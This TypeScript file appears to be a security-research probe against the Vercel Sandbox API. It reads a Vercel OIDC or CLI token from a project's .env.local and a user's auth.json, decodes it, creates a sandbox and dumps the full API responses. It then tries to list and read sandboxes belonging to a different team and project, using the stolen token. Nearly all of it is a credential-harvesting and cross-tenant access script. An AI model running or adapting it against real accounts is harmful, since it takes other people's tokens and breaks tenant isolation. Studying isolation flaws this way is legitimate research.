import { Sandbox } from "@vercel/sandbox";
import { readFileSync, writeFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";

async function main() {
  const client = new APIClient({ token: VICTIM, teamId, projectId });
  const name = "dump-" + Date.now();
  const created: any = await client.createSandbox({
    name, projectId, token: VICTIM,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  console.log("===== CREATE SANDBOX FULL JSON =====");
  console.log(JSON.stringify(created.json ?? created, null, 1));
  writeFileSync("/tmp/create_dump.json", JSON.stringify(created.json ?? created, null, 1));

  const list: any = await client.listSandboxes({ projectId, limit: 50 });
  const sbxs = list.json?.sandboxes ?? list.json ?? [];
  const mine = sbxs.find((s: any) => s.name === name);
  console.log("\n===== LIST SANDBOX ENTRY (full) =====");
  console.log(JSON.stringify(mine, null, 1));

  const got: any = await client.getSandbox({ name, projectId });
  console.log("\n===== GET SANDBOX FULL JSON =====");
  console.log(JSON.stringify(got.json ?? got, null, 1));
  writeFileSync("/tmp/get_dump.json", JSON.stringify(got.json ?? got, null, 1));

  // cross-tenant: intentar acceder a OTRO proyecto/team con este token
  console.log("\n===== CROSS-TENANT: lista de OTRO teamId/projectId =====");
  const otherTeam = "team_Tot08em9MgVFhARjP9xELTLS"; // proyecto atacante
  const otherProj = "prj_ZygqqKW3wnuiaLESKr4A7EoCmWIU";
  try {
    const c2 = new APIClient({ token: VICTIM, teamId: otherTeam, projectId: otherProj });
    const l2: any = await c2.listSandboxes({ projectId: otherProj, limit: 50 });
    console.log("cross-tenant OK:", JSON.stringify(l2.json ?? l2).slice(0, 500));
  } catch (e) {
    console.log("cross-tenant ERR:", (e as Error).message.slice(0, 200));
  }
  // cross-tenant: getSandbox de un sandbox conocido del otro proyecto
  try {
    const c2 = new APIClient({ token: VICTIM, teamId: otherTeam, projectId: otherProj });
    const g2: any = await c2.getSandbox({ name: "recon-target", projectId: otherProj });
    console.log("cross-tenant get OK:", JSON.stringify(g2.json ?? g2).slice(0, 300));
  } catch (e) {
    console.log("cross-tenant get ERR:", (e as Error).message.slice(0, 200));
  }

  // cleanup
  try { await client.deleteSandbox({ name, projectId }); } catch {}
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });